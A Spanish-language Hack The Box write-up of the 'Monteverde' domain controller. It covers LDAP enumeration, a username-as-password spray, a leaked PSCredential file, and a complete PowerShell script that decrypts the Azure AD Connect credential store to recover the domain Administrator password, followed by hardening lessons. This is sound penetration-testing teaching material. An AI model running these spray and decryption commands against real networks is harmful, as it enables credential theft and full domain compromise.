---
title: "HTB: Monteverde · de credenciales de Azure AD Connect filtradas a Domain Admin"
date: 2026-09-10
draft: false
tags: ["hackthebox", "active-directory", "windows", "escalada-privilegios", "azure-ad-connect", "password-spraying"]
summary: "Un Controlador de Dominio Windows retirado de dificultad media, construido sobre una mala configuración real: una credencial de sincronización de Azure AD filtrada en una carpeta de usuario da acceso inicial, y una instalación local de Azure AD Connect resulta guardar la contraseña del Administrator del dominio en una base de datos local descifrable."
---

## Resumen

Monteverde es una máquina Windows retirada de dificultad media de Hack The Box, un Controlador de Dominio construido alrededor de una mala configuración real: tener Azure AD Connect instalado directamente en el propio DC. El camino es:

1. Enumeración **LDAP anónima**, que recupera la lista real de usuarios del dominio.
2. Un **password spray usando cada usuario como su propia contraseña**, que encuentra una cuenta válida pero de bajo privilegio.
3. El acceso SMB de esa cuenta revela una **credencial en texto plano dejada en la carpeta de un usuario**, que da un punto de apoyo autenticado.
4. La pertenencia a un grupo con nombre sospechoso, "Azure Admins", resulta ser un **señuelo**, tanto para abuso de ACL como para DCSync.
5. El camino real es el **almacén local de credenciales de Azure AD Connect**: como el servicio de sincronización corre en esta misma máquina, la contraseña de su cuenta de conector se puede descifrar localmente, y esa cuenta es el Administrator del dominio.

Objetivo: `10.129.228.111`, un Controlador de Dominio Windows Server del dominio `MEGABANK.LOCAL`.

## Enumeración

Escaneo completo de TCP:

```bash
nmap -sC -sV -p- -oN nmap-monteverde.txt 10.129.228.111
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap          (Global Catalog)
3269/tcp  open  ldapssl?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing (AD Web Services)
...
```

Kerberos, LDAP, el Global Catalog y ADWS (9389) confirman un Controlador de Dominio. El `593`/`49xxx` (`ncacn_http`) es RPC sobre HTTP, no un servidor web navegable, así que no añade superficie de ataque aquí. Sin credenciales de partida, lo primero que merece la pena comprobar es si LDAP acepta un **bind anónimo**, un vector aparte de las sesiones nulas de SMB y complementario a ellas:

```bash
ldapsearch -x -H ldap://10.129.228.111 -b "dc=megabank,dc=local" "(objectClass=user)" sAMAccountName
```

Funciona, y devuelve la lista completa de usuarios del dominio, junto con los atributos `userPrincipalName` y `description`. Conviene notar que este es un vector de enumeración realmente distinto de la clásica sesión nula de SMB/RPC (que también se prueba, pero en esta máquina no es la que da resultado): el bind LDAP anónimo es un vector propio, que merece probarse incluso cuando SMB está bien cerrado.

## Punto de entrada

Con usuarios reales, el siguiente paso obvio es **AS-REP Roasting**, pero vuelve vacío:

```bash
impacket-GetNPUsers -no-pass -dc-ip 10.129.228.111 MEGABANK.LOCAL/ -usersfile users.txt
```

Ninguna cuenta tiene la preautenticación de Kerberos desactivada. Antes de probar algo más ruidoso, se comprueba la política de contraseñas:

```bash
netexec smb 10.129.228.111 --pass-pol
```

```
Minimum password length: 7
Password complexity: False
Account lockout threshold: None
```

Sin bloqueo de cuenta y sin complejidad exigida, el password spraying es seguro y tiene buenas probabilidades. Una variante concreta, y fácil de pasar por alto, es probar **cada usuario como su propia contraseña**:

```bash
netexec smb 10.129.228.111 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

```
[+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

Un acierto. `SABatchJobs` se autentica por SMB pero no está en el grupo Remote Management Users, así que WinRM la rechaza. El acceso SMB autenticado, sin embargo, desbloquea shares que estaban denegados de forma anónima:

```bash
netexec smb 10.129.228.111 -u SABatchJobs -p SABatchJobs --shares
```

```
azure_uploads    READ
NETLOGON         READ
SYSVOL           READ
users$           READ
```

`users$` contiene un árbol de carpetas personales por usuario. Al explorarlo como `SABatchJobs` aparece un archivo interesante en la carpeta de `mhope`:

```bash
smbclient //10.129.228.111/users$ -U 'SABatchJobs%SABatchJobs'
smb: \mhope\> get azure.xml
```

```xml
<Objs Version="1.1.0.1">
  <Obj RefId="0">
    <TN RefId="0"><T>System.Management.Automation.PSCredential</T></TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">mhope</S>
      <SS N="Password">4n0therD4y@n0th3r$</SS>
    </Props>
  </Obj>
</Objs>
```

Un objeto de credencial de PowerShell serializado con la contraseña dejada en texto plano, probablemente creado por un administrador al exportar credenciales de sincronización de Azure AD para un script y dejar el archivo en el sitio equivocado. Funciona directamente contra WinRM:

```bash
netexec winrm 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
# (Pwn3d!)

evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
```

```
*Evil-WinRM* PS C:\Users\mhope\Documents> type C:\Users\mhope\Desktop\user.txt
13434740************************dc
```

Flag de usuario capturada.

## Escalada de privilegios · descifrado de credenciales de Azure AD Connect

La enumeración tras el punto de apoyo muestra que `mhope` pertenece a un grupo personalizado, "Azure Admins", junto con `Administrator` y una cuenta llamada `AAD_987d7f2f57d2`. Ese patrón de nombre es característico de una cuenta de servicio de sincronización de Azure AD Connect. Es tentador asumir que ese grupo concede algún privilegio especial, así que merece la pena comprobarlo directamente en vez de suponerlo:

- **Abuso de ACL**: `dsacls` y un barrido de ACL de todo el dominio buscando "Azure Admins" o `mhope` no devuelven nada. No existe ningún permiso delegado sobre `AAD_987d7f2f57d2` ni en ningún otro sitio.
- **DCSync**: `impacket-secretsdump` con `mhope` falla directamente. `whoami /all` tampoco muestra nada más allá de los privilegios por defecto.

Ambas son vías muertas, confirmadas en vez de asumidas. La pista real está en otro sitio: la descripción de `AAD_987d7f2f57d2` en AD dice "Service account for the Synchronization Service ... running on computer MONTEVERDE". Azure AD Connect está instalado directamente en este Controlador de Dominio, lo cual ya es de por sí una mala práctica real.

Azure AD Connect guarda las credenciales que usa para hablar con el AD local en una base de datos local (**ADSync**, una instancia LocalDB de SQL Server), cifradas con una librería que trae en su propio directorio de instalación. Cualquier cuenta que pueda consultar esa base con seguridad integrada, y cargar esa misma librería, puede descifrarla:

```powershell
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader(); $reader.Read() | Out-Null
$key_id = $reader.GetInt32(0); $instance_id = $reader.GetGuid(1); $entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader(); $reader.Read() | Out-Null
$config = $reader.GetString(0); $crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null; $km.GetActiveCredentialKey([ref]$key)
$key2 = $null; $km.GetKey(1, [ref]$key2)
$decrypted = $null; $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
```

```
forest-login-user: administrator
password: d0m@in4dminyeah!
```

La "cuenta conectora AD DS" que Azure AD Connect usa para sincronizar el directorio local resulta ser el propio `Administrator` del dominio, con su contraseña recuperable por cualquiera que pueda llegar a esta base de datos local. Se pasa directamente a WinRM:

```bash
evil-winrm -i 10.129.228.111 -u Administrator -p 'd0m@in4dminyeah!'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
826b7927************************0f
```

Flag de root capturada. Compromiso total del dominio.

## Lecciones

Monteverde recuerda bien que "Azure AD Connect" y la identidad híbrida traen su propia superficie de ataque, distinta de las malas configuraciones clásicas de AD local:

- **Nunca instales Azure AD Connect en un Controlador de Dominio.** Debe correr en un servidor dedicado y endurecido; cualquiera que pueda llegar a su base de datos local con el acceso adecuado puede potencialmente recuperar la contraseña de la cuenta conectora.
- **Nunca des a la cuenta conectora AD DS privilegios de Domain Admin.** Azure AD Connect solo necesita permisos delegados suficientes para la sincronización de directorio y de hashes de contraseña, no control total del dominio.
- **Un nombre de grupo tentador no es evidencia de un privilegio.** Que "Azure Admins" contenga la cuenta de sync y a `Administrator` invita a teorías de ACL o DCSync, ambas probadas y ambas vías muertas. Hay que verificar los permisos directamente en vez de asumirlos por el nombre.
- **Exportar credenciales como XML de PSCredential no es una forma segura de guardar secretos.** Un archivo de credenciales al estilo `Export-Clixml` solo está protegido en la medida en que lo estén los permisos del propio archivo; dejar uno en una carpeta personal compartida es una fuga prácticamente en texto plano.
- **Una política de contraseñas débil amplifica cualquier otro problema.** Sin umbral de bloqueo y sin exigencia de complejidad, un simple spray de usuario como contraseña fue viable desde el principio.

*Los flags están parcialmente ocultos, por convención.*

---

También redacté este ejercicio como un informe de test de intrusión formal, el mismo formato que entregaría a un cliente, con resumen ejecutivo, hallazgos puntuados con CVSS y guía de remediación.

📄 [**Descargar el informe de pentest completo (PDF)**](/reports/Monteverde_Pentest_Report/Monteverde_Pentest_Report_ES.pdf)
